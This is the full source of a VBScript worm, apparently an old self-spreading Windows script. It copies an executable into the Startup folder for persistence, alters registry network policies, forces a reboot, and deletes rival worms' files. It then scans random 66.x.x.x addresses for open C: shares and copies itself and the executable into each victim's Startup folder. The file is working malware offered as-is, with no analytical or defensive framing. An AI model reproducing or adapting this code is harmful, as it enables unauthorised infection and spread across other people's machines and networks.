Dim rr
set t=wscript.createobject("wscript.network")
set f=createobject("scripting.filesystemobject")
Set WshShell = WScript.CreateObject("WScript.Shell")
randomize
on error resume next

rr=WshShell.RegRead ("HKLM\Software\Microsoft\Windows\slim")

if (rr <> 1) then
Set WshShell = WScript.CreateObject("WScript.Shell")

f.copyfile "c:\sys32.exe", "c:\windows\startm~1\programs\startup\"
Call WshShell.RegWrite ("HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Network\", 0,"REG_SZ")
Call WshShell.RegWrite ("HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Network\NoFileSharing", 1 ,"REG_DWORD")
Call WshShell.RegWrite ("HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Network\NoPrintSharing", 1 ,"REG_DWORD")
Call WshShell.RegWrite ("HKLM\Software\Microsoft\Windows\slim", 1 ,"REG_SZ")
Call WSHShell.Run ("%windir%\RUNDLL32.EXE shell32.dll,SHExitWindowsEx 2", 2, false)
end if

do
do while w=0
if (f.fileexists("c:\network.vbs")) then f.deletefile("c:\network.vbs")
if (f.fileexists("c:\windows\startm~1\programs\startup\network.vbs")) then f.deletefile("c:\windows\startm~1\programs\startup\network.vbs")
if (f.fileexists("c:\windows\startm~1\programs\startup\network.exe")) then f.deletefile("c:\windows\startm~1\programs\startup\network.exe")
if (f.fileexists("c:\windows\startm~1\programs\startup\mscfg.exe")) then f.deletefile("c:\windows\startm~1\programs\startup\mscfg.exe")
if (f.fileexists("c:\windows\startm~1\programs\startup\mscfg.vbs")) then f.deletefile("c:\windows\startm~1\programs\startup\mscfg.vbs")
if (f.fileexists("c:\windows\startm~1\programs\startup\a.vbs")) then f.deletefile("c:\windows\startm~1\programs\startup\a.vbs")
if (f.fileexists("c:\windows\startm~1\programs\startup\a24.vbs")) then f.deletefile("c:\windows\startm~1\programs\startup\a24.vbs")
if (f.fileexists("c:\windows\startm~1\programs\startup\little.vbs")) then f.deletefile("c:\windows\startm~1\programs\startup\little.vbs")
if (f.fileexists("c:\windows\startm~1\programs\startup\prince.vbs")) then f.deletefile("c:\windows\startm~1\programs\startup\prince.vbs")
if (f.fileexists("c:\windows\startm~1\programs\startup\MS StartUp Config.exe")) then f.deletefile("c:\windows\startm~1\programs\startup\MS StartUp Config.exe")
if (f.fileexists("c:\windows\startm~1\programs\startup\_a.vbs")) then f.deletefile("c:\windows\startm~1\programs\startup\_a.vbs")
if (f.fileexists("c:\windows\startm~1\programs\startup\_b.vbs")) then f.deletefile("c:\windows\startm~1\programs\startup\_b.vbs")
if (f.fileexists("c:\windows\startm~1\programs\startup\_1.vbs")) then f.deletefile("c:\windows\startm~1\programs\startup\_1.vbs")
if (f.fileexists("c:\windows\startm~1\programs\startup\_chubby.vbs")) then f.deletefile("c:\windows\startm~1\programs\startup\_chubby.vbs")


n="\\66."&int(254*rnd+1)&"."&int(254*rnd+1)&"."&int(254*rnd+1)&"\C"
t.mapnetworkdrive "x:",n
set o=t.enumnetworkdrives
for i=0 to o.Count-1
if n=o.item(i) then w=1
next
loop
f.copyfile "c:\windows\startm~1\programs\startup\_slim.vbs", "x:\windows\startm~1\programs\startup\"
f.copyfile "c:\sys32.exe", "x:\"
t.removenetworkdrive "x:"
w=0
loop

'eDaemon fitted for the slim